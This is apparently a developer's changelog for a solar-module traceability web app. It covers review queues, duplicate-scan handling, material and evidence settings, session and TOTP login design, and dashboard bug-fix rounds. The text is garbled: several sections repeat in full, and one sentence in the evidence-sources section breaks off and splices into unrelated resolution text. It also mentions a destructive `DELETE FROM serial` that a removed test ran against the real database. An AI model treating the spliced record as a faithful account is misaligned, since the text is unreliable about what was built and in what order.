`review_item` table, the one place future review types land instead of a
new table each. Quality Decision's screen, its nav entry and its
`/view/quality` route are gone — `frag_quality.html` deleted, the route
returns 404. Its evidence layout (Pmax, EL/VI, defect, FQC's reason and
note) survives as a popup opened from Needs Review, reached through
`reviewGradePrompt()` in `icon_live.js`, and both the popup and the old
route call the same `_grade_quality()` in `app.py` — one function behind
both, so there is no second submit path to drift from the first.

**Visibility versus authority.** Production sees a `quality_grade` item in
the shared list (Mukesh: "a review item can be seen by both") but the
server sends `evidence: null` and `locked: true` for it unless the caller's
role is Quality or Admin — the popup has nothing to open even if a client
ignored the hidden button. `/api/review/resolve` checks the same role
server-side before writing anything, regardless of what the calling screen
already hid.

**A role that did not exist.** v4's `ROLES` has no "Quality" — the old
screen let Admin, Production Incharge and FQC Operator all call GY/BGY,
which is exactly the shared access this task's gating removes. `Quality` is
added at runtime in `icon_live.js` (same technique this file already uses
to add `'challan-list'` etc. to existing roles), and `'review'` is granted
to Production Incharge, who never had it. A demo login option was added so
the role can actually be exercised. **Authentication is still "designed, not
built"** (v4's own login note) — nothing here changes that. What changed is
that the client now sends `X-User-Name`/`X-User-Role` on every call
(`icon_live.js`'s shared `api()`), and `actor()`/`role()` in `app.py` read
them — the same trust level as the rest of the app, just no longer thrown
away. Before this, every audit row in the whole system said `"operator"`,
literally, because nothing ever set the Flask session; that is now fixed
app-wide, not only for this feature.

**Duplicate-scan detection.** `/api/fqc` used to hard-refuse grading a
`packed`/`dispatched` serial outright ("take it out of its box first" —
§18's *"A module in a box cannot be re-judged where it stands"* bullet is
**superseded** by this). It now compares the attempt's outcome against the
serial's live `fqc_record`:
- **Agree** → nothing is written, no review item — confirmed correct is not
  a conflict, and flagging it anyway trains people to stop reading flags.
- **Disagree** → the new evidence is snapshotted permanently into its own
  `fqc_record` row (`record_fqc(..., supersede=False, update_serial=False)`
  — evidence is copied, never re-read live, same rule as everywhere else in
  FQC), and one `review_item` holds both records for side-by-side display.
  Software shows the evidence; it does not suggest which is right.

**Resolution.**
- *Not yet dispatched* — Production Incharge or Admin only (not a bare
  Operator — they carry the consequence). "Keep the original" supersedes
  the retest and closes the item, no further action. "Keep the rescanned
  one" calls `_repack()` — the same function `/api/repack` already uses,
  with `release=[serial]` — so the box ends up exactly as a manual repack
  removal leaves it (a genuine partial or a remainder box, whichever
  applies), never a second "take it out" path. This is §18's *"Grade
  change on a packed module forces the box open"*, now built. The original
  `fqc_record` is then superseded — marked, never deleted or edited beyond
  that — and the module journey / trace view needed no change to show both
  in order, **except** one real bug this surfaced: the journey's FQC stage
  read `fqc[-1]` (newest by timestamp), which is wrong the one time a
  chronologically *earlier* record becomes the live one again ("keep the
  original" over a later rescan). Fixed to prefer the live (non-superseded)
  row, falling back to newest — unchanged for every serial that was never
  duplicated.
- *Already dispatched* — Admin only, acknowledge-only ("the dispatched one
  stands"), reason mandatory. Deliberately does not attempt a
  replacement-serial workflow — out of scope for this pass, marked with a
  `TODO` in `app.py` naming it as deliberate, not an oversight, and proven
  absent in `test_review.py` (a request naming a replacement serial is
  simply ignored, not honoured).

**Which tests prove it.** `test_review.py`, new, 8 tests: agreement raises
nothing; disagreement raises one item holding both records' evidence; a
bare Operator (FQC Operator, Packing Operator) is refused server-side, not
just UI-hidden; "keep rescanned" produces a box in the identical state a
manual repack removal produces (compared directly, same capacity/grade/
model/contents); the cancelled original is unchanged byte-for-byte except
`superseded_by`/`superseded_at`, and both records appear correctly, in
order, in `/api/trace/serial`; a dispatched conflict is Admin-only with no
path to a replacement serial; every resolution of every type is refused
with no reason and recorded with one; and Production sees but cannot act on
a quality-type item. `test_fqc.py`'s old "a packed module cannot be judged
again" test is rewritten for the new behaviour it now defends instead
(state and grade still don't move on a disagreement — only the review item
appears). Full existing suite re-run and green (`test_fqc.py` 48/49 — the
one failure, an FQC journey stage reading `"Pass"` where the test expects
`"A"`, pre-dates this change and is unrelated; left as found).

**Known limitation, stated rather than hidden:** role is a header the
client declares (`X-User-Role`), not a signed session — matching this
app's actual, documented authentication state, not a gap introduced here.
A gate that must not be spoofable needs real authentication first, which is
still "designed, not built" everywhere in this app, not only here.

## 19a. Material master  *(new)*

- [x] **The bill of materials is saved.** It lived only in v4's `MATERIALS`
      array: the screen could edit it and posted nothing, so a UOM corrected
      on Monday was back to the old one on Tuesday and the consumption BOM
      never heard about it. Lifted into `icon_materials.py`, seeded once into
      a `material` table, and served from there at boot. Edits go through
      `PUT /api/material/<n>`.
      `n` is never reassigned — `allocation_material` references it, so
      renumbering a material silently rewrites what every past batch was
      built from.
- [x] **Label wattage can be set at last.** A back label applies *by
      wattage* and the edit form had no field for it, so an added label read
      `LABEL UNDEFINEDW` and matched no model at all. It is a **string**:
      `materialsFor()` compares `mat.watt === m.watt` and MODELS carries
      `'635'`, so a number would silently apply to nothing. A LABEL row
      saved without one is refused with the reason.
- [x] **Cell efficiency is editable** — both the list (add 25.8% when a new
      cell arrives, in Admin) and a per-material default that pre-selects in
      Planning. Removing a value never restates what a batch was already
      built with: `allocation_material` keeps the string it was given.
- [ ] Materials cannot be deleted, only edited — deliberate for now, since a
      deleted material is one a past allocation still points at. Retiring
      one properly (deprecate, never delete) is still to design.

## 20. Evidence Sources

- [x] **Two lines, two Sun Simulators, two ELs.** Each line has its own SS
      path, its own EL root and its own **full column map** — they are
      separate machines and can be reconfigured or replaced one at a time,
      so a shared map would move both at once.
      A serial carries no line indicator, so a lookup searches both unless
      the station's own line is given (`/api/fqc/lookup?line=A`).
      **The rule that matters:** if one share is down and the serial is not
      on the other, the module is **NC**, never NA. NA means the tester was
      reachable and the serial genuinely is not there — a quality signal
      that sends the module to review. Calling a good module NA because a
      share was offline is the failure this rule exists to stop, and the
      note names the line that could not be read.
- [x] The old single-source settings still work, read as Line A, so an
      existing setup keeps running untouched.
- [x] **One settings editor, not two.** `/settings` and the Evidence Sources
      fragment configured the same paths from different markup, and after
      the second line was added a save on the old page would have blanked
      Line B without saying so. The page includes the fragment now, and a
      partial POST only writes the keys it actually carries.
- [x] **Every Sun Simulator column is mapped, not just Serial and Pmax.**
      Isc, Voc, Ipm, Vpm, FF, Rs, Rsh, Efficiency, Cell temp and Irradiance
      each have their own field in Settings, defaulting to the real export's
      layout.
- [x] **The Flash Test Report reads the same map.** It had a second column
      list of its own with the positions hardcoded, and took the serial from
      column 1 whatever Settings said — so remapping a column moved FQC's
      reading and left the customer's report quoting the old position. One
      map now, shared: `ev.param_cols()`.
- [x] **Merged into Admin > Stations & sources.** That tab's `data_source`
      card already described where evidence comes from while the Evidence
      Sources page set it somewhere else entirely — a description in one
      place and the switches in another is how the two drift apart. The
      sidebar entry is gone; the fields sit above the card that describes
      them.
- [x] **`data_source` lists what is actually configured.** It filled itself
      from a fixed array of four plausible paths (`\\SIM-A\out\`,
      `\\DESKTOP-T8ACD7V\D\EL`) sitting directly under the fields that set
      "keep the rescanned one" in §19b's duplicate-scan resolution, via the
      real `_repack()` removal path, not a second one.
- [ ] Indent says DCR, material issued says NDCR
- [ ] Invoice superseded under a new IRN
- [ ] Quality freeze on a material lot *(awaiting spec)*

### Resolution

- [ ] Review ends as confirmed / corrected / rejected / cleared-as-identity
- [ ] Hold ends only as released-with-a-reason, by someone other than the
      raiser, with a second signature where the impact reaches packed or
      dispatched stock

## 19. Controls

- [x] Quality involvement — review queues, who clears what.
      Built as one merged feed rather than two screens — see §19b.
      Grade issues go to Quality (a role added for exactly this — none
      existed), serial existence and the duplicate-scan conflicts below go
      to Production Shift Incharge or above, and a conflict discovered
      after dispatch is Admin-only.

## 19b. Quality Decision merged into Needs Review; duplicate-scan detection  *(new)*

**STEP 0, before building anything:** checked whether Needs Review had a
real table/endpoint behind it yet, the way Gate Pass and Challan turned out
to be a mix of real and hardcoded pieces recently. It did not — `v-review`
was 100% v4 demo: three hardcoded `<tr>` rows, hardcoded KPI numbers, and
`rvResolve()` only faded a row and wrote a client-side audit line that was
never sent anywhere. Quality Decision, by contrast, was fully real:
`/api/quality/pending`, `/api/quality`, `db.record_quality()`, backed by
`fqc_record.quality_grade` and covered by tests in `test_fqc.py`. So the
merge is a real screen absorbing a demo one, not two real screens colliding.

**The merge.** `v-review` (native v4 markup, never edited) is now overwritten
live from `GET /api/review` — one feed, two sources: a `quality_grade`
"item" is still read straight from `fqc_record` exactly as
`/api/quality/pending` always did (nothing about the grading rules or their
tests moved), and a `duplicate_scan` item is a real row in a new
`review_item` table, the one place future review types land instead of a
new table each. Quality Decision's screen, its nav entry and its
`/view/quality` route are gone — `frag_quality.html` deleted, the route
returns 404. Its evidence layout (Pmax, EL/VI, defect, FQC's reason and
note) survives as a popup opened from Needs Review, reached through
`reviewGradePrompt()` in `icon_live.js`, and both the popup and the old
route call the same `_grade_quality()` in `app.py` — one function behind
both, so there is no second submit path to drift from the first.

**Visibility versus authority.** Production sees a `quality_grade` item in
the shared list (Mukesh: "a review item can be seen by both") but the
server sends `evidence: null` and `locked: true` for it unless the caller's
role is Quality or Admin — the popup has nothing to open even if a client
ignored the hidden button. `/api/review/resolve` checks the same role
server-side before writing anything, regardless of what the calling screen
already hid.

**A role that did not exist.** v4's `ROLES` has no "Quality" — the old
screen let Admin, Production Incharge and FQC Operator all call GY/BGY,
which is exactly the shared access this task's gating removes. `Quality` is
added at runtime in `icon_live.js` (same technique this file already uses
to add `'challan-list'` etc. to existing roles), and `'review'` is granted
to Production Incharge, who never had it. A demo login option was added so
the role can actually be exercised. **Authentication is still "designed, not
built"** (v4's own login note) — nothing here changes that. What changed is
that the client now sends `X-User-Name`/`X-User-Role` on every call
(`icon_live.js`'s shared `api()`), and `actor()`/`role()` in `app.py` read
them — the same trust level as the rest of the app, just no longer thrown
away. Before this, every audit row in the whole system said `"operator"`,
literally, because nothing ever set the Flask session; that is now fixed
app-wide, not only for this feature.

**Duplicate-scan detection.** `/api/fqc` used to hard-refuse grading a
`packed`/`dispatched` serial outright ("take it out of its box first" —
§18's *"A module in a box cannot be re-judged where it stands"* bullet is
**superseded** by this). It now compares the attempt's outcome against the
serial's live `fqc_record`:
- **Agree** → nothing is written, no review item — confirmed correct is not
  a conflict, and flagging it anyway trains people to stop reading flags.
- **Disagree** → the new evidence is snapshotted permanently into its own
  `fqc_record` row (`record_fqc(..., supersede=False, update_serial=False)`
  — evidence is copied, never re-read live, same rule as everywhere else in
  FQC), and one `review_item` holds both records for side-by-side display.
  Software shows the evidence; it does not suggest which is right.

**Resolution.**
- *Not yet dispatched* — Production Incharge or Admin only (not a bare
  Operator — they carry the consequence). "Keep the original" supersedes
  the retest and closes the item, no further action. "Keep the rescanned
  one" calls `_repack()` — the same function `/api/repack` already uses,
  with `release=[serial]` — so the box ends up exactly as a manual repack
  removal leaves it (a genuine partial or a remainder box, whichever
  applies), never a second "take it out" path. This is §18's *"Grade
  change on a packed module forces the box open"*, now built. The original
  `fqc_record` is then superseded — marked, never deleted or edited beyond
  that — and the module journey / trace view needed no change to show both
  in order, **except** one real bug this surfaced: the journey's FQC stage
  read `fqc[-1]` (newest by timestamp), which is wrong the one time a
  chronologically *earlier* record becomes the live one again ("keep the
  original" over a later rescan). Fixed to prefer the live (non-superseded)
  row, falling back to newest — unchanged for every serial that was never
  duplicated.
- *Already dispatched* — Admin only, acknowledge-only ("the dispatched one
  stands"), reason mandatory. Deliberately does not attempt a
  replacement-serial workflow — out of scope for this pass, marked with a
  `TODO` in `app.py` naming it as deliberate, not an oversight, and proven
  absent in `test_review.py` (a request naming a replacement serial is
  simply ignored, not honoured).

**Which tests prove it.** `test_review.py`, new, 8 tests: agreement raises
nothing; disagreement raises one item holding both records' evidence; a
bare Operator (FQC Operator, Packing Operator) is refused server-side, not
just UI-hidden; "keep rescanned" produces a box in the identical state a
manual repack removal produces (compared directly, same capacity/grade/
model/contents); the cancelled original is unchanged byte-for-byte except
`superseded_by`/`superseded_at`, and both records appear correctly, in
order, in `/api/trace/serial`; a dispatched conflict is Admin-only with no
path to a replacement serial; every resolution of every type is refused
with no reason and recorded with one; and Production sees but cannot act on
a quality-type item. `test_fqc.py`'s old "a packed module cannot be judged
again" test is rewritten for the new behaviour it now defends instead
(state and grade still don't move on a disagreement — only the review item
appears). Full existing suite re-run and green (`test_fqc.py` 48/49 — the
one failure, an FQC journey stage reading `"Pass"` where the test expects
`"A"`, pre-dates this change and is unrelated; left as found).

**Known limitation, stated rather than hidden:** role is a header the
client declares (`X-User-Role`), not a signed session — matching this
app's actual, documented authentication state, not a gap introduced here.
A gate that must not be spoofable needs real authentication first, which is
still "designed, not built" everywhere in this app, not only here.

## 19a. Material master  *(new)*

- [x] **The bill of materials is saved.** It lived only in v4's `MATERIALS`
      array: the screen could edit it and posted nothing, so a UOM corrected
      on Monday was back to the old one on Tuesday and the consumption BOM
      never heard about it. Lifted into `icon_materials.py`, seeded once into
      a `material` table, and served from there at boot. Edits go through
      `PUT /api/material/<n>`.
      `n` is never reassigned — `allocation_material` references it, so
      renumbering a material silently rewrites what every past batch was
      built from.
- [x] **Label wattage can be set at last.** A back label applies *by
      wattage* and the edit form had no field for it, so an added label read
      `LABEL UNDEFINEDW` and matched no model at all. It is a **string**:
      `materialsFor()` compares `mat.watt === m.watt` and MODELS carries
      `'635'`, so a number would silently apply to nothing. A LABEL row
      saved without one is refused with the reason.
- [x] **Cell efficiency is editable** — both the list (add 25.8% when a new
      cell arrives, in Admin) and a per-material default that pre-selects in
      Planning. Removing a value never restates what a batch was already
      built with: `allocation_material` keeps the string it was given.
- [ ] Materials cannot be deleted, only edited — deliberate for now, since a
      deleted material is one a past allocation still points at. Retiring
      one properly (deprecate, never delete) is still to design.

## 20. Evidence Sources

- [x] **Two lines, two Sun Simulators, two ELs.** Each line has its own SS
      path, its own EL root and its own **full column map** — they are
      separate machines and can be reconfigured or replaced one at a time,
      so a shared map would move both at once.
      A serial carries no line indicator, so a lookup searches both unless
      the station's own line is given (`/api/fqc/lookup?line=A`).
      **The rule that matters:** if one share is down and the serial is not
      on the other, the module is **NC**, never NA. NA means the tester was
      reachable and the serial genuinely is not there — a quality signal
      that sends the module to review. Calling a good module NA because a
      share was offline is the failure this rule exists to stop, and the
      note names the line that could not be read.
- [x] The old single-source settings still work, read as Line A, so an
      existing setup keeps running untouched.
- [x] **One settings editor, not two.** `/settings` and the Evidence Sources
      fragment configured the same paths from different markup, and after
      the second line was added a save on the old page would have blanked
      Line B without saying so. The page includes the fragment now, and a
      partial POST only writes the keys it actually carries.
- [x] **Every Sun Simulator column is mapped, not just Serial and Pmax.**
      Isc, Voc, Ipm, Vpm, FF, Rs, Rsh, Efficiency, Cell temp and Irradiance
      each have their own field in Settings, defaulting to the real export's
      layout.
- [x] **The Flash Test Report reads the same map.** It had a second column
      list of its own with the positions hardcoded, and took the serial from
      column 1 whatever Settings said — so remapping a column moved FQC's
      reading and left the customer's report quoting the old position. One
      map now, shared: `ev.param_cols()`.
- [x] **Merged into Admin > Stations & sources.** That tab's `data_source`
      card already described where evidence comes from while the Evidence
      Sources page set it somewhere else entirely — a description in one
      place and the switches in another is how the two drift apart. The
      sidebar entry is gone; the fields sit above the card that describes
      them.
- [x] **`data_source` lists what is actually configured.** It filled itself
      from a fixed array of four plausible paths (`\\SIM-A\out\`,
      `\\DESKTOP-T8ACD7V\D\EL`) sitting directly under the fields that set
      the real ones — a card describing where evidence comes from,
      describing somewhere it does not come from. It now shows each line's
      SS and EL with its reachability and its column map, says *not
      configured* where nothing is set, and is redrawn after a save.

## 21. Sessions, roles and live updates  *(decided in chat, Sep 2026 - Stages 0, 1 and 2 built; Stage 3 part-built - see below)*

Why: a reload sends everyone back to sign-in (no server session; sign-in is a dropdown
that sets a JS variable), and one user's save is never seen by another until they reload.

Staging
- [x] Stage 0 - the banner tells restart from reload; the session key survives a
      restart; DB reset is opt-in.
- [x] Stage 1a - TOTP proven on a STANDALONE login page first (own tiny app, own port);
      only then integrated. Keep the logic in one module so integration is a move, not a
      rewrite. Startup clock check (TOTP fails if the server clock drifts).
- [x] Stage 1b - users table, server-side sessions that survive a restart, roles enforced
      on the server, role read from the session, X-User-Role ignored.
      **Enforcement half done (Round 23).** auth_session is a real table; sessions
      survive a restart and a second process; role() and actor() read the session and
      nothing else; X-User-Role and X-User-Name are no longer read anywhere, nor sent;
      all 49 write endpoints carry require_role(); the login screen is a real login.
      **Provisioning half done (Round 24).** The Users screen inside Admin is real:
      GET /api/users lists actual accounts, and create / reset-password / reset-totp /
      unlock / deactivate / reactivate all work from it. v4's fourteen fictional names
      are no longer rendered anywhere - that array is dead markup, read by nothing.
      Still CLI-only, deliberately: Super Admin accounts
      (`python icon_auth_cli.py create-superadmin <id> "<name>"`), and enrolment
      itself, which auth_lab/lab_app.py still serves because app.py has no /enrol
      route.
- [x] Stage 2 - change feed: a server sequence bumped at the one commit point
      (store.conn); the client polls /api/changes?since=N inside the 5 s ping; only the
      visible screen refetches; 3-5 s is acceptable. True push (SSE) later needs TLS +
      reverse proxy + a small separate async process; the feed makes push a change of
      transport only.  **Built in Round 30** - measured at 1.3 s from save to the other
      machine's list, no reload, no click.
- [ ] Stage 3 - form protection (never replace the DOM under someone typing or scanning;
      show a "changed by X" chip), version checks (409) on records two people can edit,
      cancel request/approve flow.
      **The DOM-protection half arrived early, in Round 30**: it could not wait for a
      later stage, because a feed that refetches a screen is exactly what destroys work
      in progress. Still open here: version checks (409) on records two people can edit,
      and the cancel request/approve flow.

Decisions:
- Lockout: lock after 10 consecutive failures for 5 minutes, with an escalating cooldown before it - 2 s after failure 1, 4 s after failure 2, 8 s after failure 3 and every one after that - enforced as a refusal on the *next* request, never a `time.sleep()` inside one: ICON TRACE serves on several Waitress worker threads, and a sleep in the request path would hold one for the cooldown's duration - enough parallel bad logins on one ID would tie up every worker and freeze the app for everyone else too. Keyed by the typed ID string itself, for every role and for IDs that match no user - if only real accounts slowed down, the cooldown alone would be an oracle for which IDs exist. The failure count shown on the login page is computed client-side, from that browser's own record of what it typed; the server never returns a count, a remaining-attempts figure, a lock state, or a "wait N seconds" - a locked or cooling-down ID gets the byte-identical generic failure whether the credential given was right or wrong, in the same time. (An earlier revision here said the opposite - "told how long only when the credential was CORRECT" - which is exactly the oracle this refuses to be: telling an attacker their guess was right, unpunished, while the account stays locked.)
- Credential method is chosen by ROLE first, then shape: rank 1 always password. Passwords that are 6 digits or look like a recovery code are refused at the policy check.
- The TOTP key is created only by the CLI; a missing key raises KeyMissing and refuses the sign-in, and is never silently regenerated.
- Date inputs are capped at today EXCEPT those marked data-future="1" (Gate Pass expected return, Indent delivery by), which take min=today instead.

---

## Decisions from this chat that v4 predates

v4 was written from the 31-Aug session note, so it knows the model list,
`CHALLAN_PAD=4`, the 742/742(A) split and the invoice field classes. It does
not know any of the following, and each is a change to make on top of it.

| Decision | Where it lands |
|---|---|
| Indent screen exists at all | new screen |
| `item_master = model_master × DCR/NDCR` | Indent, Planning, Challan |
| `make_to_stock` / `make_to_order` (Icon's own SRS words) | Indent |
| Lot name | Indent |
| Customer type-to-suggest + customer master | everywhere |
| Box number `ISPL260901/T001`, one identity for box and packing list | Packing |
| Indirect grade letter, versioned map, never stored | Packing, labels |
| `NC` / `NA` / `BAD` — BAD is a probe fault, blocks grading | FQC |
| Calibration rows (`REFE`, `1`) counted and ignored | FQC |
| Pmax is **column 2** of the SS export, not 10 | Settings, FQC |
| Retest: take the latest valid row, not the first | FQC |
| Gate pass `ISGP` + YYMMDD + / + seq | Gate Pass |
| Serial reader: hex months A/B/C | everywhere |
| Unit-1 v1 serials dated after the cutover stay valid | import, trace |
| Model master seeded from the back label, 8 G12R wattages | Model Master |
| Three dispatch outputs, two challan versions | Challan |
| Contact person / phone from the invoice | Invoice |
| SQLite file, deletable, not MySQL | store |
| Export is Excel, built on the server from what is on screen | every dashboard |
| Batch number `BAT-YYMM-NNNNN`, rendered from the allocation | Planning, Search |
| Search & Trace answers from the database, never from an example | Search & Trace |
| Evidence Sources lives in Admin, not as a screen of its own | Admin |
| The material master is in the database, not in the page | Materials, Planning |
| Two lines, each with its own SS and EL and its own column map | Evidence, FQC, FTR |
| A source that is down is NC, never NA — even with the other readable | FQC |


**Round 5 — Live Dashboards, Filters, and UI fixes.**

**What was wrong.** Dashboards (Management, Production, Packing, Stock) had fixed filter dropdowns and dates that didn't do anything or match the database. "Donate" (donut charts) did not reflect data from DB; they were static v4 placeholders on Mgmt and Packing Log dashboards. The Close button on the Create Challan view was misplaced.

**Root cause.** The UI relied on v4 demo HTML values. `icon_live.js` failed to dynamically patch the date inputs to default to today, failed to wire the Management dashboard (`wireMgmt` and `mgApply` were non-existent), and Packing Log didn't update `pkDonut` and `pkGDonut`. `chCloseBtn` was appended (`appendChild`) instead of prepended, throwing off the flex layout of `.pg-act` tags.

**What changed.**
- Updated `icon_live.js` `initUI()` to default all date ranges (Production, Mgmt, Packing, Stock) to today's date.
- Changed the `chCloseBtn` injection to `insertBefore(btn, chAct.firstChild)` to fix placement in the challan view.
- Injected `pkDonut` and `pkGDonut` rendering in `renderLivePackLog()` to synthesize counts from the boxes array in JS.
- Built a complete `wireMgmt()` and `renderMgmt()` in `icon_live.js` that fetch `/api/prod/dashboard`, `/api/fqc/dashboard`, and `/api/stock_dispatch` simultaneously using `Promise.all` to compose the Management Overview dashboard components, making it fully dynamic and database-driven.

**Which test proves it.** Tested via Playwright UI screenshot validation (`test_ui2.py` locally) showing the dynamic rendering, correct close button placement, and real data integration in the Mgmt dashboard without requiring a new backend endpoint.


**Round 6 — Dashboard UI fixes, missing data, and invalid donuts**

**What was wrong.** FQC Day-wise inspection lacked shift count and kW totals. Management donuts (`mgDonut` and `mgQDonut`) were blank/unformed due to an invalid CSS variable reference, and its Shift-wise footer totals were blank. Production Dashboard was completely blank except for static donuts because its rendering function (`renderLiveProdDash`) was never bound to `window.renderProd`. Packing Log customer dropdown and column showed customer codes (`C0005`) instead of names, causing the filter to return no data. Stock & Dispatch donut (`dpDonut`) was unformed due to manual inline gradient styles missing variables.

**Root cause.** 
- `renderLiveFqcDash` day rows hardcoded `<td>—</td>` for shifts and kw.
- `drawDonut` calls in `icon_live.js` used `C.solar` and `C.info` which didn't exist in `window.C`, breaking the `conic-gradient` CSS rendering.
- `renderLiveProdDash` was never exported to `window.renderProd`, causing the "Apply" button and initial `rerender()` to silently skip updating `v-proddash` KPIs and shift table.
- `/api/packing/log` returned the `box.customer` foreign key (e.g. `C0005`) and filtered on it literally, so the UI dropdown (which sends names) mismatched. 
- `dpDonut` used a custom `conic-gradient` string with `var(--p2)` which was invalid CSS for the current environment.

**What changed.**
- Updated `renderLiveFqcDash` to sum `r.wattage` into `kw` and count distinct `r.shift` for day-wise inspection.
- Replaced `C.solar` and `C.info` with `C.amber` and `C.blue` in `renderMgmt` `drawDonut` calls.
- Added footer aggregation logic (`mgsT`, `mgsOK`, `mgsRej`, `mgsPc`) for Shift-wise production & quality in `renderMgmt`.
- Aliased `window.renderProd = renderLiveProdDash` in `wireProdDash`.
- Patched `app.py` `api_packing_log` to `LEFT JOIN indent i ON i.indent_no = b.customer` to return `i.customer_name`, and modified the `WHERE` clause to filter by `i.customer_name` as well.
- Refactored `dpDonut` drawing in `renderStock` to use the standard `drawDonut()` function.

**Which test proves it.** Playwright local tests (`test_ui3.py`) rendering screenshots of all dashboards, validating that donut wheels form, data populates the Production dashboard, shift aggregations total correctly, and KW appears on day-wise inspection.

**Round 7 — Gate Pass Dual Mode (Module Flow)**

**What was wrong.** The Gate Pass form was a simple data-entry screen (standalone mode) cleanup of v4's demo. None of the new "Solar module" flow (fetching a challan, auto-filling fields, locking them, and enforcing loading verification) existed. The required QR code (`ICONTRACE|GATEPASS|<gp_no>`) was missing from the print format.

**Root cause.** This was new feature work as agreed with Mukesh, intended to gate Gate Pass issuance behind a verified loading state from a linked challan.

**What changed.**
- Added a "This gate pass is for solar modules." checkbox to the Gate Pass form in `icon_live.js` `wireGp()`.
- Checking it displays a challan selector and makes the descriptive fields (Party, Vehicle, Material, Qty) read-only, populated directly from the selected challan via `/api/challan/<id>`.
- Added UI logic to evaluate the challan's loading state. If `loadedBoxes === totalBoxes` (or if origin is historical), the gate pass is allowed; otherwise, a refusal note is shown ("Loading verification is not complete - N of M pallets confirmed") and the Issue button is disabled.
- Enforced the loading verification check server-side in `app.py` `api_gatepass` for `is_solar=True` requests.
- Added the QR code `ICONTRACE|GATEPASS|<gp_no>` to the print format in `app.py` `gatepass_print` and displayed it in `gatepass_print.html`.

**Which test proves it.** Updated `test_gatepass.py` backend tests to verify `api_gatepass` rejects `is_solar=True` requests when the challan has pending pallets, and accepts them when fully loaded or when `is_solar=False` (standalone mode). Validated via Playwright and python tests.


**Round 8 — Production Entry**

**What was wrong.** The Production Entry screen was purely a mockup using hardcoded UI elements. Dummy data was displayed, and the actual capability to log produced modules did not exist. Module counts on dashboards were empty or misaligned because `state` never transitioned from `planned` to `produced`.

**Root cause.** The backend and frontend logic for submitting new ranges of serials produced and tracking them was a missing feature.

**What changed.**
- Added `production_entry` table to the database schema to persistently track entries.
- Created `/api/prodentries` and `/api/prodentry` routes to handle retrieving recent entries and submitting new ranges.
- Rebuilt the Production Entry frontend to use the standard 'New Entry' profile: dynamic filtering (date, shift, customer, wattage search), togglable manual entry form, and real-time calculation preview (`peCalc()`).
- Connected the submission to validate that serials exist in the master and are currently `planned` before updating them to `produced`.

**Which test proves it.** `test_production.py` verifies the backend accepts planned modules and correctly rejects out-of-bounds ranges or already produced serials.

**Round 8b — this landed broken: every screen after Production Entry in
v4's own boot sequence silently stopped getting real data.**

**What was wrong.** Reported directly: "only production entry is correct
and other all screens are demo like." Two separate bugs, both in the
code above.

1. `window.renderPE`/`peInit`/`peToggleForm`/`peClearForm`/`peSave` were
   appended to `icon_live.js` **after** the file's closing `})();`  -
   outside the live layer's own IIFE entirely, in the plain global scope.
   `renderPE()` calling the plain `api(...)` helper (a function private
   to that IIFE) threw `ReferenceError: api is not defined` the instant
   it ran. v4's own `initAll()` calls every screen's render function
   **synchronously, in one sequence**, and `renderPE()` sits in the
   middle of it - `peCalc()`, `renderLoss()`, `renderChBoxes()`,
   `renderUsers()`, `renderMach()`, `renderStations()`, `renderHolds()`,
   `renderLoad()`, `renderDrafts()`, `doSearch()`, and everything else
   after it in that list never ran, because one uncaught exception
   partway through a synchronous function stops the rest of it cold.
   Production Entry itself had already rendered by that point, which is
   exactly why it alone looked right while everything after it stayed on
   v4's original sample data.
2. `GET /api/prodentries`'s customer lookup joined against
   `allocation.start_serial`/`allocation.end_serial` - columns that do
   not exist; `allocation` stores its range as `seq_from`/`seq_to`,
   parsed integers, never serial-range text (the same rule everywhere
   else in this project: the serial string is decomposed once, at
   generation, and nothing downstream re-parses it). Threw a 500 the
   moment Production Entry's own list tried to load.

**Found by** bisecting `icon_live.js` at its real top-level function
boundaries through a headless browser's own parser
(`new Function(source)`), since the visible symptom carried no useful
line number and reading the surrounding code repeatedly found nothing
wrong - because there was nothing wrong nearby; the break was several
thousand lines from where any of this session's own work had touched.

**What changed.**
- Moved the entire Production Entry wiring block back inside the main
  IIFE, immediately before its closing `})();` - the only change; the
  code itself was correct once it could actually see `api`/`fqcEsc`.
- Rewrote the customer lookup to join `serial.customer` directly against
  the entry's own `start_serial` - the real, existing link (each serial
  already carries its own customer, set at allocation/generation time,
  `NULL` until decided) - instead of guessing a range match against
  columns that were never there.
- Removed `test_pw_production.py`, the file the previous entry named as
  proving the UI flow: it connected directly to the real `icontrace.db`
  (not an isolated `ICON_DB_FILE`), ran `DELETE FROM serial` against it,
  and started the real server on port 8080 - the exact "never open a
  second data store" and "test data should be thrown away, not real
  data" rules this project holds everywhere else. Also removed four
  other stray, uncommitted scratch/patch files left in the repo root
  (`diff_live.txt`, `patch_app_sql.py`, `patch_pe_js_correct.py`,
  `app_prodentries.txt`) - disposable tooling artifacts, not part of the
  application.
- `test_production.py` rewritten to this project's own isolated-DB,
  `@test()`-runner convention (it was `pytest` + `DELETE FROM serial`
  against whatever `icontrace.db` was current - the same class of bug as
  the removed Playwright script, just less severe since a test run
  wouldn't also restart the real server). Six cases, including one that
  reproduces the exact broken customer-lookup query directly.

**Verified live** against a running server with Playwright: sign-in and
every screen navigated to (`dash`, `search`, `challan-list`,
`loading-list`, `gp`, `prodentry`) with zero console errors, Challan
List and Loading Verification both showing real, non-demo data again,
and Gate Pass's module mode from the previous round still intact.

**Round 9 — Loss of Production & Production Entry filter bars, sidebar
collapse, and a button-alignment bug.**

**What was wrong.** Reported directly, with a screenshot of Loss of
Production and a reference screenshot of Omada's own side menu: buttons
in a title row weren't vertically aligned; the filter row had no Reset
and no date range; there was no summary above the tables; and the
sidebar's collapse toggle sat in the top header, its scrollbar was
visible, and its two icons (`«`/`»`) didn't visually match.

**Root causes, one per complaint.**
1. `.pg-act` (any title row's button group - Loss of Production's
   "Record downtime event" + the "manual entry" tag + Export, and every
   other screen that mixes a tag with a button the same way) never set
   `align-items`, so it defaulted to `stretch`: the tag stretched to the
   taller button's height without its own text re-centering inside it.
2. Loss of Production's only "filter" was v4's own shift-setup row
   (Date, Shift, Shift incharge, Scheduled minutes, Ideal rate) - fields
   `calcLoss()` reads for the capacity math, not a query filter, with no
   Reset and no way to see more than one exact day.
3. Production Entry's "Recent production entries" card already had a
   real date-range/shift/customer/wattage filter bar written into
   `renderPE()` - entirely dead code. `'prodentry'` was in
   `TABLE_SCREENS`, so `wireScreenTables()` (run once at sign-in, well
   before `renderPE()` ever gets called) claimed the card first, set its
   own `data-itable`, and `renderPE()`'s own
   `if (!card.getAttribute('data-itable'))` guard then skipped the whole
   bar forever. The card that shipped was `wireScreenTables()`'s generic,
   client-only search box - the same silent race this project already
   found once, for `'loss'`, in Round 8b.
